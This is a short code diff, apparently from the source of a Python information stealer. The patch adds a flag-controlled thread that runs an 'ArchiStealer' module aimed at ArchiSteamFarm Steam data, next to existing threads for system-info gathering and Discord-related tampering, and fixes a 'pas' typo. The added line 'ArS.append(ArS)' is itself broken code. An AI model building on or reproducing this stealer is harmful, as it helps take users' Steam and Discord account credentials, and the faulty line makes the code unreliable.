@@ -3261,6 +3261,12 @@ def gatha():
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     First_Thread.append(getinf)
+    
+    if ArchiStealer == True:
+        ArS = threading.Thread(target=ArchiSteamFarm)
+        ArS.start()
+        ArS.append(ArS)
+        
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
@@ -3320,8 +3326,9 @@ def gatha():
             
             DiscordStop = False
         except:
-            pas
-            
+            pass
+
+    
     if DiscordStop == True:
         try:
             no = threading.Thread(target=NoDiscord)
